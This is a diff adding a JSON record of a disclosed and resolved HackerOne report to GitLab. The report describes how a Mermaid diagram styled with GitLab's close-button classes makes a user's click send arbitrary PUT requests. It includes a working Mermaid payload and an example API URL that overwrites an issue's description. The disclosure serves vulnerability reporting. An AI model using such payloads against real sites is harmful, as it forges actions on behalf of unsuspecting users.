@@ -1,0 +1,119 @@
+{
+  "id": 824689,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MjQ2ODk=",
+  "url": "https://hackerone.com/reports/824689",
+  "title": "Send arbitrary PUT requests when user clicks on a link",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-03-19T14:09:58.998Z",
+  "submitted_at": "2020-03-19T14:09:58.998Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "yvvdwf",
+    "url": "/yvvdwf",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ubqmt760dugarh527x4qc4mkdn4n/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-07-27T08:44:34.335Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-07-27T08:39:58.419Z",
+  "team_member_agreed_on_going_public_at": "2020-07-27T08:44:34.259Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Dear teams,\n\n### Summary\n\nMermaid allows users to set class name of a block. This ability becomes vulnerable in Gitlab issues because of [issue.js#L90](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/issue.js#L90):\n\n```javascript\n    return $(document).on(\n      'click',\n      '.js-issuable-actions a.btn-close, .js-issuable-actions a.btn-reopen',\n      e => {\n...\n       const $button = $(e.currentTarget);\n...\n        const url = $button.attr('href');\n        return axios\n          .put(url)\n          .then(({ data }) => {\n...\n```\n\n### Steps to reproduce\n\n 1. Create any issue\n 2. Enter the following payload as the description of the issue:\n\n```\n```mermaid\ngraph TD;\n A[Click to send a PUT request];\n class A js-issuable-actions;\n class A btn-close;\n click A \"./put-destination\" \"click to PUT\"\n```\n\nAfter saving the issue, if you click on the block `Click to send a PUT request`, a `PUT` request will be sent to `./put-destination`\n\n### Impact\n\nSince attacker can control `./put-destination`, he can theoretically can perform any PUT requests on behalf of the current user.\nFor example, attacker can use the following url to update the description of issue #2:\n\n`/api/v4/projects/16210710/issues/2?description=a`\n\n### Examples\n\nAn example is available here: https://gitlab.com/yvvdwf/xss/-/issues/1 (it is private, pls let me know if you cannot access it)\n\n### Output of checks\n\nThis bug happens on GitLab.com\n\n## Impact\n\nWhen received click of user, attacker may perform arbitrary PUT requests of the behalf of the user",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 133,
+  "voters": [
+    "overjt",
+    "sky003",
+    "muthu_prakash",
+    "omarelfarsaoui",
+    "n1m0",
+    "n0x496n",
+    "badcracker",
+    "foobar7",
+    "kapytein",
+    "holme",
+    "and 123 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18138,
+    "asset_type": "URL",
+    "asset_identifier": "gitlab.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
